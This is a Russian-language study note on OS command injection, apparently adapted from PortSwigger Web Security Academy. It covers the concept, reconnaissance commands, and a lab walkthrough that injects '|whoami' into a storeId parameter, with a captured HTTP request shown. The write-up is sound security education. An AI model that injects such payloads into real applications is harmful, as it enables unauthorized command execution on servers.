What is OS command injection?
Что такое внедрение команд ОС?

Внедрение команд ОС также известно как внедрение оболочки. Это позволяет злоумышленнику выполнять команды операционной системы (ОС) на сервере, на котором запущено приложение, и обычно полностью подвергать риску приложение и его данные. Часто злоумышленник может использовать уязвимость внедрения команд ОС для компрометации других частей хостинговой инфраструктуры и использовать доверительные отношения для перенаправления атаки на другие системы внутри организации.

Полезные команды

После того как вы обнаружите уязвимость внедрения команд ОС, полезно выполнить несколько начальных команд, чтобы получить информацию о системе. Ниже приводится краткое описание некоторых команд, полезных на платформах Linux и Windows:

Purpose of command 	Linux 		Windows
------------------------------------------------------
Name of current user 	whoami 		whoami
Operating system 	uname -a 	ver
Network configuration 	ifconfig 	ipconfig /all
Network connections 	netstat -an 	netstat -an
Running processes 	ps -ef 		tasklist 


Внедрение команд ОС

В этом примере приложение для покупок позволяет пользователю просмотреть, есть ли товар на складе в определенном магазине. Доступ к этой информации осуществляется через URL-адрес:
https://insecure-website.com/stockStatus?productID=381&storeID=29

Чтобы предоставить информацию о запасах, приложение должно запрашивать различные устаревшие системы. По историческим причинам эта функциональность реализуется путем вызова команды оболочки с идентификаторами продукта и магазина в качестве аргументов:
stockreport.pl 381 29

Эта команда выводит состояние запасов указанного товара, который возвращается пользователю.

Внедрение команд ОС – продолжение

Приложение не реализует никакой защиты от внедрения команд ОС, поэтому злоумышленник может отправить следующий ввод для выполнения произвольной команды:
& echo aiwefwlguh &

Если эти входные данные представлены в параметре ProductID, команда, выполняемая приложением, будет следующей:
stockreport.pl & echo aiwefwlguh & 29

Команда echo вызывает отображение предоставленной строки в выходных данных. Это полезный способ проверки некоторых типов внедрения команд ОС. Символ & является разделителем команд оболочки. В этом примере он вызывает выполнение трех отдельных команд одну за другой. Вывод, возвращаемый пользователю:
Error - productID was not provided
aiwefwlguh
29: command not found

Три строки вывода демонстрируют, что:

     Исходная команда stockreport.pl была выполнена без ожидаемых аргументов и поэтому вернула сообщение об ошибке.
     Введенная команда echo была выполнена, и предоставленная строка была отражена в выходных данных.
     Исходный аргумент 29 был выполнен как команда, что вызвало ошибку.

Размещение дополнительного разделителя команд & после введенной команды полезно, поскольку он отделяет введенную команду от всего, что следует за точкой внедрения. Это снижает вероятность того, что последующие действия помешают выполнению введенной команды.


Lab: OS command injection, simple case
Лабораторная работа: Внедрение команд ОС, простой случай.

Эта лабораторная работа содержит уязвимость, связанную с внедрением команд ОС в средство проверки запасов продуктов.

Приложение выполняет команду оболочки, содержащую предоставленные пользователем идентификаторы продуктов и магазинов, и возвращает необработанные выходные данные команды в своем ответе.

Для решения лабораторной работы выполните команду whoami, чтобы определить имя текущего пользователя.

Решение

     Используйте Burp Suite, чтобы перехватить и изменить запрос на проверку уровня запасов.
     Измените параметр storeID, присвоив ему значение 1|whoami.
     Обратите внимание, что ответ содержит имя текущего пользователя.
     
1. start Burp Suite
2. ЗАходим в посмотреть любой товар и жмем Check stock (нам надо получить любой ответ от сервера, что бы можно было его модифицировать)
3. находим в HTTP history /product/stock

POST /product/stock HTTP/2
Host: 0a2a0028044d90098114165f0061005b.web-security-academy.net
Cookie: session=QKhCjoLVrzgrugiC1z8D2EsepX3C7tHG
Content-Length: 21
Sec-Ch-Ua: "Not(A:Brand";v="24", "Chromium";v="122"
Sec-Ch-Ua-Platform: "Linux"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.112 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: */*
Origin: https://0a2a0028044d90098114165f0061005b.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a2a0028044d90098114165f0061005b.web-security-academy.net/product?productId=1
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Priority: u=1, i

productId=1&storeId=1

Здесь мы видим, что на запрос productId=1&storeId=1 мы получаем ответ: 
HTTP/2 200 OK
Content-Type: text/plain; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 3

62

4. теперь можно подменить ззапрос productId=1&storeId=1 на:
productId=1&storeId=1|whoami   (whoami или любой другой командой, например id)



